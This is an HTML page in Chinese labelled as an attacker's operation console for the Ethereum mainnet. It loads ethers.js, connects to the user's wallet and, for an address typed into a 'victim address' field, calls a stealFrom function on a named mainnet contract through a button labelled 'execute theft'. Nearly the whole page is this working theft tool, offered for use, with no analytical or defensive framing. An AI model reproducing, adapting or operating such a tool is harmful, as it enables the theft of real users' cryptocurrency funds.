
<!DOCTYPE html>
<html lang="zh">
<head>
  <meta charset="UTF-8">
  <title>控制台 | 主網 v3.0</title>
  <script src="https://cdn.jsdelivr.net/npm/ethers/dist/ethers.umd.min.js"></script>
</head>
<body>
  <h2>🛠️ 攻擊者操作介面 v3.0（Ethereum 主網）</h2>
  <p>合約地址：<b>0xDa4FfA490992769B8F54063bf0B9E7a4D3479459</b></p>
  <input type="text" id="victim" placeholder="輸入受害者地址" size="60" />
  <button onclick="steal()">執行盜取</button>
  <pre id="log">🪵 等待輸入...</pre>

  <script>
    const contractAddr = "0xDa4FfA490992769B8F54063bf0B9E7a4D3479459";
    const abi = [
      "function stealFrom(address victim) public"
    ];

    async function steal() {
      const v = document.getElementById("victim").value;
      const output = document.getElementById("log");
      output.innerText = "📡 呼叫 stealFrom(" + v + ")...";

      try {
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        const signer = provider.getSigner();
        const contract = new ethers.Contract(contractAddr, abi, signer);
        const tx = await contract.stealFrom(v);
        output.innerText += "\n✅ 成功送出 TX: " + tx.hash;
      } catch (err) {
        output.innerText += "\n❌ 失敗：" + err.message;
      }
    }
  </script>
  <p style="margin-top:20px; color:gray;">版本：v3.0 主網</p>
</body>
</html>
